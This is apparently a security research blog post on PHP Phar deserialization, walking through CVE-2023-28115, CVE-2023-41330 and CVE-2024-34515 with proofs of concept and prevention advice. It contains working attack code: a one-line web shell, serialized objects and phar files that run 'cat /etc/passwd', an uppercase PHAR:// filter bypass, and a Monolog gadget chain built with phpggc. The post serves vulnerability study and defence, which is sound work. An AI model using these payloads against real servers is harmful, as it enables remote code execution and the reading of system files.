---
title: "Phar Deserialization leads to RCE"
description: "Phar Deserialization leads to RCE"
summary: "Phar Deserialization leads to RCE"
categories: ["Research"]
tags: ["PHP", "Phar", "Deserialization", "Web"]
#externalUrl: ""
date: 2025-08-07
draft: false
cover: ../../post/phar-deserialization/feature.png
authors:
  - winky
---

## Introduction

**Phar Deserialization** is a popular bug related to file upload vulnerability and insecure serialization. Although this bug nearly fixed in the latest version of PHP, some functions is still available to trigger this bug and get harm to your server.

### Phar

**PHAR** are like JARs of Java but for PHP, compatible with 3 formats (Phar, Tar, Zip). In other words, PHAR - PHP Archive is a form of compressing PHP application into a single executable file. A Phar file can be loaded via phar wrapper phar:// . For example: `phar://relative/path/to/phar/file.xyz/.inc`. Moreover, a Phar file have 4 parts: 

* Stub: The first part includes php code but must have `__HALT_COMPILER();` in the end
* Manifest: The manifest details the contents of the archive (object type)
* File Contents: The original files that are included in the archive
* Signature: this is a hash function for verifying PHAR integrity.

![image](https://hackmd.io/_uploads/HJpzbTWOxx.png)

This is the detailed structure for this file

![image](https://hackmd.io/_uploads/By2TMa-uxl.png)

### How to make a phar file

A simple template to make a phar file is

```php
<?php
class User {
	public $name = "winky";
	public $age = 18;
}
$obj = new User();
$phar = new Phar("test.phar");
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata($obj);
$phar->stopBuffering();
?>
```

In this code, stub is `<?php __HALT_COMPILER(); ?>`, manifest or Phar Metadata is $obj (new User class) and file contents is text from test.txt file. Now we can build it with a simple command:

`php -d phar.readonly=0 phar.php`

what is phar.readonly ? For secured, this setting will allow us to create and modify using phar stream, by default this is enable: [phar.readonly option](https://www.php.net/manual/en/phar.configuration.php#:~:text=the%20configuration%20directives.-,phar.readonly%20bool,-This%20option%20disables)

### File upload vulnerability

File upload vulnerability or [CWE-434](https://cwe.mitre.org/data/definitions/434.html) is a common weakness in a web server. A user may upload unexpected or non-standard files, which can alter the server’s behavior and potentially lead to serious issues such as Remote Code Execution (RCE).

POC:

A user can upload a simple shell if the server don't strictly filter it

```php
<?php
system($_GET["cmd"]);
?>
```

And we can run php file in apache server

![image](https://hackmd.io/_uploads/Hybbt6bdll.png)


### Insecure Deserialization

Insecure Deserialization or [CWE-502](https://cwe.mitre.org/data/definitions/502.html) is a weakness about using untrusted data. Attackers can modify unexpected objects or data that was assumed to be safe from modification. Deserialized data or code could be modified without using the provided accessor functions, or unexpected functions could be invoked.

Magic functions: Magic methods are special methods which override PHP's default's action when certain actions are performed on an object. The attacker can exploit magic methods to execute arbitrary code, manipulate object behavior, or trigger unintended functionality — especially during object deserialization or when user-controlled data is passed into magic methods like __wakeup(), __destruct(), or __toString().

POC:

Imagine we have a simple class will create a json file based on the $name argument of class

```php
<?php
class User{
    private $name;
    private $age;
    private $func = "touch";
    function __construct($name, $age){
        $this->name = $name;
        $this->age = $age;
    }
    function __destruct(){
        call_user_func( $this->func, 'user/'.$this->name.'.json' );
    }
}

$a = new User('winky', 18);
?>
```
![image](https://hackmd.io/_uploads/r1scipbOgg.png)

By using unserialize() function we can override $func and $name thereby get RCE

```php
<?php

class User{
    public $name = "; cat /etc/passwd ;";
    public $age;
    public $func = "system";
}

$ser = new User();
echo serialize($ser);
// O:4:"User":3:{s:4:"name";s:19:"; cat /etc/passwd ;";s:3:"age";N;s:4:"func";s:6:"system";}
?>
```

![image](https://hackmd.io/_uploads/BkNQ1RZuee.png)


## Phar Deserialization

From PHP version 7.4 and earlier, most of file accessing  function will trigger the deserialization if we pass a phar:// wrapper file. It will deserial the metadata in phar file which is an object that we can manipulate to override default class

These functions are 

![image](https://hackmd.io/_uploads/rynpNRZdel.png)

bonus: move_uploaded_file, mime_content_type

POC: 

if i use previous context, and i create a phar file like

```php
<?php

class User{
    public $name = "; cat /etc/passwd ;";
    public $age;
    public $func = "system";
}

$obj = new User();
$phar = new Phar("test.phar");
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata($obj);
$phar->stopBuffering();

?>
```

Use one of above function to trigger, for example filesize()

PHP8:

![image](https://hackmd.io/_uploads/SJAAdA-Ogx.png)

PHP7.4:

![image](https://hackmd.io/_uploads/HkRjKA-ull.png)

So this bug is still available in PHP7.4 and have been fixed in PHP8

## CVE-2023-28115 and CVE-2023-41330

Those CVE all have high score from snyk 9.8

![image](https://hackmd.io/_uploads/HJpU9R-_lx.png)


![image](https://hackmd.io/_uploads/r1dV48oPeg.png)

### knplabs/knp-snappy

This is a PHP library for converting a HTML website to a pdf file. We can use this library like: 

```php
<?php

require __DIR__ . '/vendor/autoload.php';

use Knp\Snappy\Pdf;

$snappy = new Pdf('/usr/local/bin/wkhtmltopdf');
$snappy->generateFromHtml('<h1>Hello</h1>', 'a.pdf');
```

### Vulnerable function

From the version 1.4.1 and early, the generateFromHTML will call the this function to generate to check if 'a.pdf' is existed ([file_exist function in Snappy](https://github.com/KnpLabs/snappy/blob/5126fb5b335ec929a226314d40cd8dad497c3d67/src/Knp/Snappy/AbstractGenerator.php#L670)). So what if we pass a phar wrapper stream into it ?

### POC

This bug require PHP7.4. Use old context we can have the vulneable code like this

```php
<?php
class User{
    private $name;
    private $age;
    private $func = "touch";
    function __construct($name, $age){
        $this->name = $name;
        $this->age = $age;
    }
    function __destruct(){
        call_user_func( $this->func, 'user/'.$this->name.'.json' );
    }
}

require __DIR__ . '/vendor/autoload.php';

use Knp\Snappy\Pdf;

$snappy = new Pdf('/usr/bin/wkhtmltopdf');
try{
    $snappy->generateFromHtml('<h1>Hello</h1>', 'phar://test.phar');
}catch(\Exception $e){}
?>
```

![image](https://hackmd.io/_uploads/SkQDbJz_gl.png)

### Is it fixed?

This path was committed on the version 1.4.2 to fix CVE-2023-28115

https://github.com/KnpLabs/snappy/commit/1ee6360cbdbea5d09705909a150df7963a88efd6

![image](https://hackmd.io/_uploads/HkLAW1MOxl.png)

but the bug is still there. Because wrapper scheme is case-insensitive according to [RFC 3986](https://datatracker.ietf.org/doc/html/rfc3986#section-6.2.2.1) so we can use uppercase wrapper. For example:

![image](https://hackmd.io/_uploads/SJ8B7yGuxx.png)

So the strpos is case-insensitive then we can bypass by using PHAR://

POC:

```php
<?php
class User{
    private $name;
    private $age;
    private $func = "touch";
    function __construct($name, $age){
        $this->name = $name;
        $this->age = $age;
    }
    function __destruct(){
        call_user_func( $this->func, 'user/'.$this->name.'.json' );
    }
}

require __DIR__ . '/vendor/autoload.php';

use Knp\Snappy\Pdf;

$snappy = new Pdf('/usr/bin/wkhtmltopdf');
try{
    $snappy->generateFromHtml('<h1>Hello</h1>', 'PHAR://test.phar');
}catch(\Exception $e){}
?>
```

![image](https://hackmd.io/_uploads/rkOjQkzdll.png)

And this is CVE-2023-41330. After that a commit to use parse_url on version 1.4.3 have fixed both above CVE

https://github.com/KnpLabs/snappy/commit/d3b742d61a68bf93866032c2c0a7f1486128b67e

## CVE-2024-34515

![image](https://hackmd.io/_uploads/BJnU48sDle.png)

### image-optimizer

[image-optimizer](https://github.com/spatie/image-optimizer) is a PHP library to optimize an image if it is large. The simple syntax is

```php
<?php
require __DIR__ . '/vendor/autoload.php';

use Spatie\ImageOptimizer\OptimizerChainFactory;

$optimizerChain = OptimizerChainFactory::create();

$pathToImage = "./a.png";

$optimizerChain->optimize($pathToImage);
?>
```

### Vulnerable function

The optimize function use this function to check is an image existed https://github.com/Sonicrrrr/image-optimizer/blob/284a082b1814a846560ee1c91360bbdf3b4cb885/src/Image.php#L19

However, it also triggers phar deserialization

### POC

```php
<?php
class User{
    private $name;
    private $age;
    private $func = "touch";
    function __construct($name, $age){
        $this->name = $name;
        $this->age = $age;
    }
    function __destruct(){
        call_user_func( $this->func, 'user/'.$this->name.'.json' );
    }
}

require __DIR__ . '/vendor/autoload.php';

use Spatie\ImageOptimizer\OptimizerChainFactory;

$optimizerChain = OptimizerChainFactory::create();

$pathToImage = "phar://test.phar";

$optimizerChain->optimize($pathToImage);
?>
```

There are lots of warnings but it also get RCE on the server:

![image](https://hackmd.io/_uploads/HyblPJMOlg.png)

### Challenge

I also made a challenge related to this CVE and uploaded it in Dreamhack: [optimizer](https://dreamhack.io/wargame/challenges/2166)

## Phar image?

Phar deserialization in PHP does not care about the file extension. So that, if we rename a phar file this bugs also works.

POC:

![image](https://hackmd.io/_uploads/rJ1jukG_le.png)

But you can't use a file without a proper extension (e.g., test,abc, test, abc)

=> Bypass the pathinfo() function

## Phar deserialization and gadget chains

Because this bug works in PHP7.4 with also have other old library bug like some gadget chains in monolog, laravel, symfony, etc. You can find them at https://github.com/ambionics/phpggc

how to exploit phar deserialization with gcc? 

### Using command 

* First, clone phpgcc repo
* Next, create a phar file using this command 
`phpggc -f Monolog/RCE1 exec 'touch pwned' -p phar -o exploit.phar`
* Now you can work with it

![image](https://hackmd.io/_uploads/rJe9a1fOex.png)

You can notice that there are two files was created exploit.phar and pwned 

### Manually

* Choose your gadget chain, for example [monolog/RCE1](https://github.com/ambionics/phpggc/tree/master/gadgetchains/Monolog/RCE/1)
* Use both files in directory
* Change the chain.php to

```php
<?php

require './gadgets.php';

function generate(array $parameters)
{
    $function = $parameters['function'];
    $parameter = $parameters['parameter'];

    return new \Monolog\Handler\SyslogUdpHandler(
        new \Monolog\Handler\BufferHandler(
            ['current', $function],
            [$parameter, 'level' => null]
        )
    );
}

$p = array();
$p['function'] = 'system';
$p['parameter'] = 'cat /etc/passwd';
$obj = generate($p);

$phar = new Phar("test.phar");
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata($obj);
$phar->stopBuffering();
```

Now use `php -d phar.readonly=0 chain.php` to create phar file and yeah now you get RCE

![image](https://hackmd.io/_uploads/rkkZayzOxl.png)


## Fixing

From PHP8, this bug is not more available

https://www.php.net/manual/en/migration80.incompatible.php#migration80.incompatible.phar:~:text=with%20zero%20rows.-,Phar,-%C2%B6

PR for that fix:

https://github.com/php/php-src/pull/5855/commits/28417b781c5f112c667b596957289f752ee99259

However, getMetadata() is still unserialize phar file so be careful when work with this function

![image](https://hackmd.io/_uploads/rkIQfIsvxx.png)


## Prevention

+ Upgrade to PHP8
+ Filter all wrapper when pass it to file accessed function
+ Be careful when work with getMetadata() function

## References

* https://nhienit.wordpress.com/2020/12/12/khai-thac-lo-hong-phar-deserialize/
* https://sec.vnpt.vn/2019/08/ky-thuat-khai-thac-lo-hong-phar-deserialization
* https://blog.efiens.com/post/doublevkay/xxe-to-phar-deserialization/
* https://srcincite.io/assets/out-of-hand-attacks-against-php-environments.pdf
* https://www.synacktiv.com/ressources/modern_php_security_sec4dev.pdf
* https://www.sonarsource.com/blog/phpbb3-phar-deserialization-to-remote-code-execution/

